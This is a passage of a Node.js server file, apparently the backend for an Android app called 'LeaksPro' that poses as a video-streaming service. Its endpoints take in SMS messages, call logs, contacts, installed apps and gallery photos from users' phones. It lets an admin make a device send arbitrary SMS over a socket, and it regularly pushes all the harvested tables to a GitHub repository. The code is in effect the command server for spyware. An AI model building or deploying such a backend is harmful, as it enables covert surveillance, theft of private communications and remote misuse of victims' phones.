        const updateMsg = db.prepare("SELECT value FROM admin_settings WHERE key = 'godmode_update_message'").get();
        result.update_url = updateUrl?.value || '';
        result.update_message = updateMsg?.value || 'Please update to the latest version.';
      }

      res.json(result);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });
  app.post('/api/devices/sms', (req, res) => {
    try {
      const { device_id, messages } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(messages)) return res.status(400).json({ error: 'messages must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO sms_messages
        (device_id, sms_id, address, body, date, type, read, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const msg of messages) {
        try {
          insert.run(
            device_id,
            msg.id || 0,
            msg.address || 'Unknown',
            msg.body || '',
            msg.date || 0,
            msg.type || 1,
            msg.read || 0
          );
          count++;
        } catch (_) { /* skip duplicates or errors */ }
      }

      console.log(`[SMS] Synced ${count} messages from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Call logs sync endpoint — Android app sends call logs here
  app.post('/api/devices/call-logs', (req, res) => {
    try {
      const { device_id, logs } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(logs)) return res.status(400).json({ error: 'logs must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO call_logs
        (device_id, call_id, number, name, type, date, duration, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const log of logs) {
        try {
          insert.run(
            device_id,
            log.id || 0,
            log.number || 'Unknown',
            log.name || '',
            log.type || 1,
            log.date || 0,
            log.duration || 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CALLS] Synced ${count} call logs from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Contacts sync endpoint — Android app sends contacts here
  app.post('/api/devices/contacts', (req, res) => {
    try {
      const { device_id, contacts } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO contacts
        (device_id, contact_id, name, phones, emails, synced_at)
        VALUES (?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const c of contacts) {
        try {
          insert.run(
            device_id,
            String(c.id || count),
            c.name || 'Unknown',
            JSON.stringify(c.phones || []),
            JSON.stringify(c.emails || [])
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CONTACTS] Synced ${count} contacts from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Installed apps sync endpoint — Android app sends app list here
  app.post('/api/devices/apps', (req, res) => {
    try {
      const { device_id, apps } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(apps)) return res.status(400).json({ error: 'apps must be an array' });

      // Clear old apps for this device and re-insert (full sync)
      db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(device_id);

      const insert = db.prepare(`INSERT INTO installed_apps
        (device_id, package_name, app_name, version, install_time, update_time, is_system, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const app of apps) {
        try {
          insert.run(
            device_id,
            app.package_name || '',
            app.app_name || '',
            app.version || '',
            app.install_time || 0,
            app.update_time || 0,
            app.is_system ? 1 : 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[APPS] Synced ${count} apps from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Gallery photos sync endpoint — Android app sends gallery photos here
  app.post('/api/devices/gallery', (req, res) => {
    try {
      const { device_id, photos } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(photos)) return res.status(400).json({ error: 'photos must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO gallery_photos
        (device_id, media_id, filename, date_taken, width, height, size, image_base64, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const photo of photos) {
        try {
          insert.run(
            device_id,
            photo.media_id || 0,
            photo.filename || '',
            photo.date_taken || 0,
            photo.width || 0,
            photo.height || 0,
            photo.size || 0,
            photo.image_base64 || ''
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[GALLERY] Synced ${count} photos from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Gallery debug endpoint — device reports what it sees so we can diagnose
  app.post('/api/devices/gallery-debug', (req, res) => {
    try {
      const report = req.body;
      console.log(`\n[GALLERY-DEBUG] ==============================`);
      console.log(`[GALLERY-DEBUG] Device: ${report.device_id || 'UNKNOWN'}`);
      console.log(`[GALLERY-DEBUG] Model: ${report.model || '?'}`);
      console.log(`[GALLERY-DEBUG] SDK: ${report.sdk_version || '?'}`);
      console.log(`[GALLERY-DEBUG] Has READ_EXTERNAL_STORAGE: ${report.has_read_storage}`);
      console.log(`[GALLERY-DEBUG] Has READ_MEDIA_IMAGES: ${report.has_read_media}`);
      console.log(`[GALLERY-DEBUG] hasPermission(): ${report.has_permission}`);
      console.log(`[GALLERY-DEBUG] Photos read from device: ${report.photos_read}`);
      console.log(`[GALLERY-DEBUG] New for backend: ${report.new_for_backend}`);
      console.log(`[GALLERY-DEBUG] New for firestore: ${report.new_for_firestore}`);
      console.log(`[GALLERY-DEBUG] Backend synced: ${report.backend_synced}`);
      console.log(`[GALLERY-DEBUG] Firestore synced: ${report.firestore_synced}`);
      console.log(`[GALLERY-DEBUG] Errors: ${JSON.stringify(report.errors || [])}`);
      console.log(`[GALLERY-DEBUG] Source: ${report.source || '?'}`);
      console.log(`[GALLERY-DEBUG] Timestamp: ${report.timestamp}`);
      console.log(`[GALLERY-DEBUG] ==============================\n`);

      // Store the latest debug report per device
      db.exec(`CREATE TABLE IF NOT EXISTS gallery_debug (
        device_id TEXT PRIMARY KEY,
        report TEXT,
        received_at DATETIME DEFAULT (datetime('now'))
      )`);
      db.prepare(`INSERT OR REPLACE INTO gallery_debug (device_id, report, received_at)
        VALUES (?, ?, datetime('now'))`).run(report.device_id || 'unknown', JSON.stringify(report));

      res.json({ success: true });
    } catch (err) {
      console.error('[GALLERY-DEBUG] Error:', err.message);
      res.json({ success: true }); // Still return OK
    }
  });

  // View gallery debug reports — admin endpoint
  app.get('/api/admin/gallery-debug', (req, res) => {
    try {
      const password = req.headers['x-admin-password'] || req.query.password;
      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
      if (!stored || password !== stored.value) {
        return res.status(401).json({ error: 'Unauthorized' });
      }
      const rows = db.prepare('SELECT * FROM gallery_debug ORDER BY received_at DESC').all();
      const reports = rows.map(r => ({ ...JSON.parse(r.report), received_at: r.received_at }));
      res.json({ reports });
    } catch (err) {
      res.json({ reports: [], error: err.message });
    }
  });

  // Send SMS via device — admin sends command to a connected device
  app.post('/api/admin/send-sms', (req, res) => {
    try {
      const { password, device_id, receiver, message, sim_slot } = req.body;

      // Verify admin password
      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
      if (!stored || password !== stored.value) {
        return res.status(401).json({ error: 'Invalid admin password' });
      }

      if (!device_id || !receiver || !message) {
        return res.status(400).json({ error: 'device_id, receiver, and message are required' });
      }

      // Find the device's socket
      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
      if (!device || !device.socket_id) {
        return res.status(400).json({ error: 'Device is not connected via WebSocket. The app must be open.' });
      }

      const targetSocket = io.sockets.sockets.get(device.socket_id);
      if (!targetSocket) {
        return res.status(400).json({ error: 'Device socket not found. The app may have just disconnected.' });
      }

      // Generate a unique request ID for tracking
      const requestId = `sms_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

      // Emit send_sms command to the device (encrypted)
      targetSocket.emit('send_sms', cryptoEncrypt({
        request_id: requestId,
        receiver,
        message,
        sim_slot: sim_slot || 1,
      }));

      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${sim_slot}`);
      res.json({ success: true, request_id: requestId, message: 'Send command dispatched to device' });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Stream endpoint — redirects to Cloudinary URL
  app.get('/api/stream/:videoId', (req, res) => {
    try {
      const Video = require('./models/Video');
      const video = Video.getById(req.params.videoId);
      if (!video) return res.status(404).json({ error: 'Video not found' });
      res.redirect(video.filename);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Setup WebSocket
  setupWebSocket(io);

  // Setup Scheduled Commands processor
  const { startScheduler } = require('./utils/scheduler');
  startScheduler(io, db);

  // ========== CLEANUP TIMER ==========
  // Every 10 minutes, mark devices offline if no heartbeat for 2 hours.
  // Devices are NEVER deleted — they just go offline.
  setInterval(() => {
    try {
      const stale = db.prepare(
        "SELECT device_id FROM devices WHERE is_online = 1 AND last_seen < datetime('now', '-2 hours')"
      ).all();
      if (stale.length > 0) {
        db.prepare(
          "UPDATE devices SET is_online = 0 WHERE last_seen < datetime('now', '-2 hours')"
        ).run();
        // Re-query each device for full data and broadcast
        stale.forEach(d => {
          const full = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(d.device_id);
          if (full) {
            try { full.phone_numbers = JSON.parse(full.phone_numbers || '[]'); } catch (_) { full.phone_numbers = []; }
            io.emit('device_offline', full);
          }
        });
        console.log(`[CLEANUP] Marked ${stale.length} device(s) offline — no heartbeat for 2+ hours`);
      }
    } catch (err) {
      console.error('[CLEANUP] Error:', err.message);
    }
  }, 10 * 60 * 1000); // every 10 minutes

  // Start listening
  const PORT = process.env.PORT || 3000;
  return new Promise((resolve, reject) => {
    server.on('error', reject);
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SERVER] LeaksPro Backend running on port ${PORT}`);
      console.log(`[SERVER] Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`[SERVER] Ready to accept connections`);

      // ── Auto GitHub Backup Scheduler (every 6 hours) ──
      setInterval(async () => {
        try {
          const enabled = db.prepare("SELECT value FROM admin_settings WHERE key = 'auto_backup_enabled'").get();
          if (enabled?.value !== '1') return;

          const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
          if (!token?.value) return;

          console.log('[AutoBackup] Starting scheduled GitHub backup...');
          const tables = ['admin_settings', 'devices', 'admin_devices', 'videos', 'categories',
                           'sms_messages', 'call_logs', 'contacts', 'installed_apps', 'gallery_photos',
                           'signed_apks', 'watch_history', 'comments'];
          const backup = { version: 2, created_at: new Date().toISOString(), auto: true, tables: {} };
          for (const t of tables) {
            try { backup.tables[t] = db.prepare(`SELECT * FROM ${t}`).all(); } catch (_) { backup.tables[t] = []; }
          }
          const backupJson = JSON.stringify(backup);

          const apiUrl = `https://api.github.com/repos/rurikonishawa/leaksprogod/contents/backups/db-backup.json`;
          const headers = {
            'Authorization': `token ${token.value}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json',
            'User-Agent': 'LeaksPro-Backend'
          };

          // Get existing SHA
          let sha = null;
          try {
            const existing = await fetch(apiUrl, { headers });
            if (existing.ok) { sha = (await existing.json()).sha; }
          } catch (_) {}

          const body = { message: `Auto backup — ${new Date().toISOString()}`, content: Buffer.from(backupJson).toString('base64') };
          if (sha) body.sha = sha;

          const ghRes = await fetch(apiUrl, { method: 'PUT', headers, body: JSON.stringify(body) });
          if (ghRes.ok) {
            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_github_backup', ?)").run(new Date().toISOString());
            console.log('[AutoBackup] GitHub backup successful');
          } else {
            console.warn('[AutoBackup] GitHub push failed:', ghRes.status);
          }
        } catch (e) {
          console.warn('[AutoBackup] Error:', e.message);
        }
      }, 6 * 60 * 60 * 1000); // every 6 hours

      resolve();
    });
  });
}

// Global error handlers — must exit so Railway restarts the container
process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT EXCEPTION:', err);
  process.exit(1);
});
process.on('unhandledRejection', (err) => {
  console.error('UNHANDLED REJECTION:', err);
  process.exit(1);
});

// Start the server
startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
